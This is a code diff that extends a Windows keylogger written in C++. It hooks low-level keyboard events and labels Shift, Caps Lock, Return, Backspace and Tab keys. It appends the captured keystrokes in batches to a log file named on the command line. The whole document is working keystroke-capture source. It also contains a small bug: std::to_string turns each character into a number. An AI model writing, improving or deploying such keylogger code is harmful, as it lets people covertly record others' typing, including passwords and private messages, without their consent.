@@ -3,27 +3,20 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <vector>
+#include <string>
 
-std::vector<int> codepointBuffer;
-char* fileName;
+std::string fileName;
+std::ofstream* ofs;
+std::vector<std::string> codepointStringBuffer;
 
-static void DumpCharacterBuffer(std::vector<int>& codepointBuffer,
-                                const char* filePath) {
+static void DumpCharacterBuffer() {
 
-    std::ofstream ofs;
-    ofs.open(fileName, std::ios_base::binary | std::ios_base::app);
+    std::ofstream ofs(fileName, std::ios_base::app);
+    
+    for (const std::string& codepointString : codepointStringBuffer) {
+        ofs << codepointString;    }
 
-    union {
-        char bytes[4];
-        int i;
-    } transformer;
-
-    for (const int codePoint : codepointBuffer) {
-        transformer.i = codePoint;
-        ofs.put(transformer.bytes[0]);
-    }
-
-    codepointBuffer.clear();
+    codepointStringBuffer.clear();
     ofs.close();
 }
 
@@ -32,15 +25,51 @@ LRESULT CALLBACK KeyboardProc(int nCode,
                               LPARAM lParam) {
 
     PKBDLLHOOKSTRUCT pHookStruct = (PKBDLLHOOKSTRUCT) lParam;
+    int vkCode = pHookStruct->vkCode;
 
     switch (wParam) {
+        case WM_KEYUP:
+        case WM_SYSKEYUP:
+
+            if (vkCode == VK_LSHIFT) {
+                codepointStringBuffer.push_back(std::string("<VK_LSHIFT up>"));
+            } else if (vkCode == VK_RSHIFT) {
+                codepointStringBuffer.push_back(std::string("<VK_RSHIFT up>"));
+            }
+
+            if (codepointStringBuffer.size() >= 30) {
+                DumpCharacterBuffer();
+            }
+
+            break;
+
         case WM_KEYDOWN:
         case WM_SYSKEYDOWN:
 
-            codepointBuffer.push_back(pHookStruct->vkCode);
+            if (vkCode == VK_LSHIFT) {
+                codepointStringBuffer.push_back(std::string("<VK_LSHIFT down>"));
+            } else if (vkCode == VK_RSHIFT) {
+                codepointStringBuffer.push_back(std::string("<VK_RSHIFT down>"));
+            } else if (vkCode == VK_SPACE) {
+                codepointStringBuffer.push_back(std::string(" "));
+            } else if (vkCode == VK_CAPITAL) {
+                codepointStringBuffer.push_back(std::string("<CAPS LOCK>"));
+            } else if (vkCode == VK_RETURN) {
+                codepointStringBuffer.push_back(std::string("<RETURN>"));
+            } else if (vkCode == VK_BACK) {
+                codepointStringBuffer.push_back(std::string("<BACKWARDS>"));
+            } else if (vkCode == VK_TAB) {
+                codepointStringBuffer.push_back(std::string("<TAB>"));
+            } else {
+                char ch = (char) vkCode;
 
-            if (codepointBuffer.size() > 30) {
-                DumpCharacterBuffer(codepointBuffer, fileName);
+                if (std::isalnum(vkCode)) {
+                    codepointStringBuffer.push_back(std::to_string(ch));
+                }
+            }
+
+            if (codepointStringBuffer.size() > 30) {
+                DumpCharacterBuffer();
             }
     }
 
@@ -53,6 +82,10 @@ int WinMain(HINSTANCE hInstance,
             int nCmdShow) {
 
     fileName = pCmdLine;    
+
+    // Mark the start of session:
+    std::ofstream myOutputFileStream(fileName, std::ios_base::app);
+    ofs = &myOutputFileStream;
 
     SetWindowsHookExA(WH_KEYBOARD_LL,
                       KeyboardProc,
